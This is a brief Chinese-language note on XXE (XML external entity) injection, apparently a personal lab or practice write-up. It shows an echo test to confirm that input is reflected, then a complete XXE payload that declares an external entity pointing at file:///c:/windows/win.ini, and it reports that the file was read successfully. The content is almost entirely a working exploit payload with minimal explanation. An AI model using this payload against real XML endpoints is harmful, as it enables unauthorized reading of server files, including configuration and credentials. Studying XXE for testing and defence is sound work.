# XXE漏洞

　　简单检测

　　  **&lt;gg&gt;gg&lt;/gg&gt;**

　　返回gg字符,存在漏洞且具有回显

![image](assets/image-20251122160055-xzrelo5.png)

　　构造payload

　　 **&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE ANY [
     &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt;
&lt;a&gt;&amp;xxe;&lt;/a&gt;**

![image](assets/image-20251122160351-yggt5r7.png)

　　成功读取

　　‍
